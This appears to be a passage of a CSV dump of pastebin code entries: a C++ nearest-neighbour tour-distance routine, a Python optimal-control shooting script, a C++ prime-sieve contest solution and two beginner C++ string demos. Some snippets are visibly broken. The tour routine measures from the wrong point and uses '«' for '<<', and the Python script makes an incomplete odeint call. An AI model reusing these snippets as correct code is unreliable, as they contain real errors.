+    return sqrt((p1.x - p2.x) * (p1.x - p2.x) + (p1.y - p2.y) * (p1.y - p2.y));
+}
+
+// Функция для нахождения минимального пути, проходящего через все точки
+double minDistanceToTravel(const vector<Point>& points) {
+    int n = points.size();
+    if (n < 2)
+        throw invalid_argument(""There should be at least two points."");
+
+    vector<bool> visited(n, false);
+    visited[0] = true; // Начинаем с первой точки
+
+    double totalDistance = 0.0;
+
+    for (int i = 0; i < n - 1; ++i) {
+        int nearestIdx = -1;
+        double minDist = numeric_limits<double>::max();
+
+        for (int j = 0; j < n; ++j) {
+            if (!visited[j]) {
+                double dist = distance(points[i], points[j]);
+                if (dist < minDist) {
+                    minDist = dist;
+                    nearestIdx = j;
+                }
+            }
+        }
+
+        totalDistance += minDist;
+        visited[nearestIdx] = true;
+    }
+
+    // Возвращаемся к начальной точке
+    totalDistance += distance(points[n - 1], points[0]);
+
+    return totalDistance;
+}
+
+int main() {
+    vector<Point> points = {{1, 2}, {3, 5}, {7, 1}, {9, 5}, {5, 3}};
+
+    double minDistance = minDistanceToTravel(points);
+
+    cout « ""Minimum distance to travel through all points: "" « minDistance « endl;
+
+    return 0;
+}"
+6NhPWZ7a,H,Samurai12,Python,Thursday 14th of March 2024 06:42:27 AM CDT,"import scipy.optimize as opt
+import numpy as np
+from scipy.integrate import odeint
+
+alfa1 = 1
+alfa2 = 1
+
+
+def func(x_psi, t):
+    x1, x2, psi1, psi2 = x_psi
+    f1 = x2
+    u = psi2/(2*alfa2)
+    if abs(u) > 1:
+        u = np.sign(u)
+    f2 = -x2+u
+    f3 = 0
+    f4 = psi2-psi1
+    return [f1, f2, f3, f4]
+
+# Функция Гамильтона-Понтрягина
+
+
+def H(x_psi):
+    x1, x2, psi1, psi2 = x_psi
+    u = psi2/(2*alfa2)
+    if abs(u) > 1:
+        u = np.sign(u)
+    ans = -alfa1-alfa2*(u*u)+psi1*x2-psi2*x2+psi2*u
+    return ans
+
+
+t = np.linspace(0, 1, 1000)
+x_psi_0 = [1, 2, 3, 1.5]
+
+ans = odeint(func, x_psi_0, t)
+
+
+print(ans[:3])
+print()
+print(ans[-3:])
+
+
+H0 = H(ans[0])
+
+Hk = H(ans[-1])
+
+print(H0, Hk, abs(H0-Hk))
+
+# Начальная координата и скорость
+x10 = 1
+x20 = 1
+
+
+def Nev(psi0_tk):
+    psi10, psi20, tk = psi0_tk
+    if tk < 0:
+        print(f""tk = {tk} < 0 ..."")
+        return [1e9, 1e9, 1e9]
+    t = np.linspace(0, tk, 100)
+    ans = odeint(func, [x10, x20, psi10, psi20], t)
+    # ans[-1] - значение всех неизвезных в конце движения
+    x1k, x2k, psi1k, psi2k = ans[-1]
+    Nev1 = x1k - 0
+    Nev2 = x2k - 0
+    Nev3 = H([x1k, x2k, psi1k, psi2k])
+    return [Nev1, Nev2, Nev3]
+
+
+psi0 = [12, 3]
+tk = 5
+pogr0 = Nev([psi0[0], psi0[1], tk])
+
+print(f""pogr0 = {pogr0}"")
+print(""|pogr0| = {0}"".format(np.linalg.norm(pogr0)))
+
+ans = opt.fsolve(Nev, [psi0[0], psi0[1], tk])
+
+print(""Solution:"", ans)
+pogr = Nev(ans)
+print(""Error: "", pogr, np.linalg.norm(pogr))
+
+t = np.linspace(0, ans[2], 1000)
+ans_x_psi = odeint(func, [])
+
+
+print(""x1 x2 psi1 psi2"")
+print(ans_x_psi[:5])
+print()
+print(ans_x_psi[-5:])
+
+
+def u_opt(x_psi):
+    x1, x2, psi1, psi2 = x_psi
+    ans = psi2 / (2*alfa2)
+    if abs(ans) > 1:
+        ans = np.sign(ans)
+    return ans
+
+
+u_opt_sol = list(map(u_opt, ans_x_psi))
+print(""u_opt_sol"", u_opt_sol)
+"
+mACDu0A0,Untitled,Zeinab_Hamdy,C++,Thursday 14th of March 2024 06:37:29 AM CDT,"#include<bits/stdc++.h>
+using namespace std;
+#define nl ""\n""
+#define fi first
+#define se second
+#define pb push_back
+#define ll long long
+#define ull unsigned ll
+#define RV  return void
+#define sz(x) int(x.size())
+#define all(v) v.begin(), v.end()
+#define rall(v) v.rbegin(), v.rend()
+#define fixed(n) fixed << setprecision(n)
+#define cin(v) for (auto&i:v) cin >> i;
+#define cout(v) for (auto&i:v) cout << i << "" "";
+#define clr(memo, x) memset(memo, x, sizeof memo)
+#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
+ 
+void  Zainab(){
+            // #ifndef ONLINE_JUDGE
+              freopen(""longpath.in"", ""r"", stdin);
+              freopen(""longpath.out"", ""w"", stdout);
+            // #endif
+}
+
+const ll N = 1e7;
+vector < bool > isPrime (N + 1 , true);
+vector < ll > primes ;
+
+void pre(){
+    isPrime[0]= isPrime[1]=false;
+
+    for(ll i = 2 ; i * i <= N ; i++)
+        if(isPrime[i]) 
+            for(ll j = i * i ; j <= N ; j +=i )
+                isPrime[j] = false;
+
+    for(ll i =0 ; i < N+1 ; ++i )
+        if(isPrime[i]) primes.pb(i);
+
+}
+
+void myCode(){
+
+
+ll n;
+cin >> n ;
+
+// ll sum =0;
+// __int128 fact =1;
+// for(ll i =1 ; i <= 100 ; i++) {
+//     // long double temp = cos(  (fact + 1 )/i  *3.1415926 );
+//     // cout << i << "" "" << temp * temp << nl;
+//     if( (fact + 1 ) % i==0){
+//          sum ++; 
+//         cout << i << "" "" << sum << nl;
+//     }
+//     fact *=i;
+// }
+
+// cout << sum << nl << nl;
+
+
+long double mo = 1 , lg = ceil(log2(n));
+ll l =0 ,r = sz(primes) -1 ;
+while(l <= r ){
+    ll mid = r - (r-l)/2;
+    if(primes[mid] <= n) {
+        l = mid+1;
+        mo = mid + 2;
+    }
+    else 
+        r = mid-1;
+}
+
+// cout << mo << ""  "";
+
+cout << fixed(6) << pow( lg / mo , 1/lg) << nl;
+
+}
+ 
+ 
+int main(){
+                                   FastCode ;
+                                    //  Zainab() ;
+ 
+    int testCase=1;
+         cin >> testCase ;
+    pre();
+      for(int i=1 ; i<= testCase ; i++)
+        myCode();
+ 
+    return 0;
+}"
+Y374FCkE,Untitled,35657,C++,Thursday 14th of March 2024 06:25:24 AM CDT,"#include <iostream>
+
+
+using namespace std;
+
+
+
+
+int main() {
+	setlocale(LC_ALL, ""ru"");
+
+	string text = ""this is string"";
+
+	cout << text << endl;
+
+	for (int i = 0; i < text.size(); i++) {
+		cout << text[i];
+	}
+	cout << endl;
+
+	for (char a : text) {
+		cout << a;
+	}
+	cout << endl;
+
+	cout << text.find(""is"") << endl; // поиск подстроки в строке
+	cout << text.find(""is"", 4) << endl; // поиск подстроки начиная с указанной позиции
+	cout << text.rfind(""is"") << endl; // поиск подстроки с конца строки
+	cout << text.find(""strong"", 0, 3) << endl; // поиск первых трех символов из строки strong в строке text
+	cout << text.find_first_of(' ') << endl;
+	cout << text.find_last_of(' ') << endl;
+	cout << text.find_last_not_of(' ') << endl;
+
+	text.erase(3, 5); // удаляем пять символов, начиная с позиции 3
+
+	cout << text << endl;
+
+	string text2 = ""jkbjkbhjb"";
+
+	text.insert(3, text2); // вставляет строку text2 в указанную позицию
+
+	cout << text << endl;
+
+	text.push_back('?');
+
+	cout << text << endl;
+
+	text.pop_back();
+
+	cout << text << endl;
+
+	cout << text.substr(10) << endl; // возвращает подстроку начиная с указанной позиции
+}
+"
+C7FZ2Fge,Untitled,35657,C++,Thursday 14th of March 2024 05:56:33 AM CDT,"#include <iostream>
+
+
+using namespace std;
+
+
+
+
+int main() {
+	setlocale(LC_ALL, ""ru"");
+
+	string text = ""Hello"";
+	cout << text << endl;
+	text = ""jnjknjklnkjnjknjknjklnjkn"";
+
+	string s1;
+	string s2;
+	string s3;
+
+	s1 = ""abc"";
+	s2 = { 'a', 'b', 'c' };
+	s3 = s1;
+
+	cout << (s1 == s2) << "" "" << (s1 > s2) << endl;
+
+	s3 = s1 + ""     "" + s2;
+
+	cout << s3 << endl;
+
+	cout << s3.size() << endl;
+
+}
+"
